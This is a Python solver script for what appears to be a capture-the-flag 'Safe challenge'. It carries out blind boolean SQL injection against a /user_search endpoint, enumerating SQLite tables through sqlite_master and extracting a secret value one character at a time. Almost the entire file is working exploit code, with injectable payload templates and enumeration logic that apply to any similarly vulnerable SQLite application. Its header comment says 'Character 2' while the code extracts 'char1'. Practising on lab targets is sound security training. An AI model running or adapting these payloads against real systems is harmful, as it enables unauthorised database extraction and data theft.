# char1_sqli.py
#
# Blind SQL injection solver for Character 2 of the Safe challenge.
# Enumerates SQLite tables, discovers the secret_chars table,
# then extracts the character value.

import requests
import string

BASE = "http://safe.med.pccc:5000"
URL = BASE + "/user_search"

CHARSET = string.ascii_letters + string.digits + "_"

def is_true(injected_username: str) -> bool:
    r = requests.get(URL, params={"username": injected_username}, timeout=5)
    return "Found at least one user." in r.text


def extract_string(subquery: str, max_len: int = 64) -> str:
    """Extract a string value from a blind SQLi subquery, character by character."""
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for c in CHARSET:
            payload = f"' OR substr(({subquery}),{pos},1)='{c}' --"
            if is_true(payload):
                result += c
                found = True
                break
        if not found:
            break
    return result


def enumerate_tables() -> list:
    """Discover all non-system table names via sqlite_master."""
    # First, find how many tables exist
    count = 0
    for n in range(1, 20):
        payload = f"' OR (SELECT count(*) FROM sqlite_master WHERE type='table')>={n} --"
        if is_true(payload):
            count = n
        else:
            break

    print(f"[*] Found {count} table(s) in sqlite_master")

    tables = []
    for i in range(count):
        query = f"SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i}"
        name = extract_string(query)
        if name:
            tables.append(name)
            print(f"[*] Table {i}: {name}")

    return tables


def find_secret_table(tables: list) -> str:
    """Identify which table holds the secret character (not 'users')."""
    for t in tables:
        if t == "users":
            continue
        # Check if the table has a column 'v' with a row where k='char1'
        payload = f"' OR (SELECT v FROM {t} WHERE k='char1') IS NOT NULL --"
        if is_true(payload):
            print(f"[+] Secret table identified: {t}")
            return t
    return ""


def extract_char(table: str) -> str:
    """Extract the char1 value from the discovered table."""
    candidates = string.digits + string.ascii_letters + string.punctuation
    for c in candidates:
        payload = f"' OR (SELECT v FROM {table} WHERE k='char1')='{c}' --"
        if is_true(payload):
            return c
    return ""


def main():
    # Sanity checks
    print("[*] admin exists:", is_true("admin"))
    print("[*] definitely_no_such_user:", is_true("definitely_no_such_user"))

    # Step 1: Enumerate tables
    print("\n[*] Enumerating tables...")
    tables = enumerate_tables()

    if not tables:
        print("[-] No tables found")
        return

    # Step 2: Find the table holding the secret
    print("\n[*] Identifying secret table...")
    secret_table = find_secret_table(tables)

    if not secret_table:
        print("[-] Could not identify secret table")
        return

    # Step 3: Extract the character
    print(f"\n[*] Extracting char1 from '{secret_table}'...")
    char1 = extract_char(secret_table)

    if char1:
        print(f"[+] Found char1: {char1}")
    else:
        print("[-] Failed to recover char1")


if __name__ == "__main__":
    main()
